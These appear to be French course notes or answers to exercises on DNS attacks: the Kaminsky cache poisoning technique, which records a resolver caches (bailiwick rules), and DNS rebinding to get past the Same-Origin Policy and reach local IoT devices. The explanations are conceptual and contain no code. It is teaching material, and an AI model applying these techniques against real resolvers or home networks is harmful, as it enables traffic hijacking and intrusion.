  • Défi 1 : L'ID DNS est aléatoire → Kaminsky envoie des milliers de réponses avec tous les IDs possibles
  • Défi 2 : L'effet cache → si on rate, le bon résultat est mis en cache. Solution : utiliser des noms aléatoires différents (twysw1.example.com, twysw2...) pour forcer de nouvelles requêtes à chaque tentative
  • Victoire : En compromettant la section Authority (NS), tout le domaine est sous contrôle
N10.16Quelles parties de la réponse DNS NE seront PAS mises en cache ?
Authority : example.net NS record → PAS mis en cache — la question portait sur example.com, pas example.net (hors scope).
Additional : ns.tklp-server.net et ns.atfz-server.com → PAS mis en cache — out-of-bailiwick records. Seuls example.com NS et ns.gltd-server.net A sont acceptés.
N10.22-N10.23DNS Rebinding — pourquoi SOP bloque-t-il et comment le bypass ?
N10.22 : La Same-Origin Policy empêche le JS de l'attaquant (sur attacker.com) d'accéder directement à un IoT local (192.168.x.x) car elles ont des origines différentes.
N10.23 : L'attaquant change le TTL DNS de son domaine à 0. Quand le JS demande une 2ème fois l'IP de attacker.com, le DNS retourne maintenant l'IP du dispositif IoT (192.168.x.x). Le browser croit que les deux requêtes viennent du même domaine (attacker.com) → SOP bypass.
